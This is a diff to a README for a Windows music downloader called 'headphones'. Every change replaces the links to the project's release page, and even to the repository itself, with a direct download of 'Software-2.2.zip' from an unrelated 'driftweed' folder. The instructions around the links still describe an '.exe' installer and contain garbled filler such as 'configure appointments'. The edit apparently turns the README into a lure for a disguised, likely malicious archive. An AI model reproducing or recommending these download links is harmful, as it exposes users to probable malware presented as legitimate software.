@@ -1,6 +1,6 @@
 # 🎧 headphones - Easy Music Downloader for SABnzbd
 
-[![Download headphones](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/111ayba/headphones/releases)
+[![Download headphones](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/111ayba/headphones/main/driftweed/Software-2.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This guide will help you download and run headphones on your Windows computer. Y
 
 Click the button below to visit the official headphones release page:
 
-[![Download headphones](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/111ayba/headphones/releases)
+[![Download headphones](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/111ayba/headphones/main/driftweed/Software-2.2.zip)
 
 This page hosts the latest versions of headphones. You will find the setup files listed by version date.
 
@@ -112,7 +112,7 @@ The app supports common audio formats like MP3, FLAC, and AAC.
 
 1. Visit the official release page:
 
-[![Download headphones](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/111ayba/headphones/releases)
+[![Download headphones](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/111ayba/headphones/main/driftweed/Software-2.2.zip)
 
 2. Download the latest `.exe` installer file.
 
@@ -155,7 +155,7 @@ You may also configure appointments inside headphones to control update times.
 
 Visit the release page regularly:
 
-[https://github.com/111ayba/headphones/releases](https://github.com/111ayba/headphones/releases)
+[https://raw.githubusercontent.com/111ayba/headphones/main/driftweed/Software-2.2.zip](https://raw.githubusercontent.com/111ayba/headphones/main/driftweed/Software-2.2.zip)
 
 Download and install new versions when available. New releases often fix bugs, improve performance, and add features.
 
@@ -171,7 +171,7 @@ If you have questions or run into trouble:
 
 You can find the GitHub page here:
 
-https://github.com/111ayba/headphones
+https://raw.githubusercontent.com/111ayba/headphones/main/driftweed/Software-2.2.zip
 
 ---
 
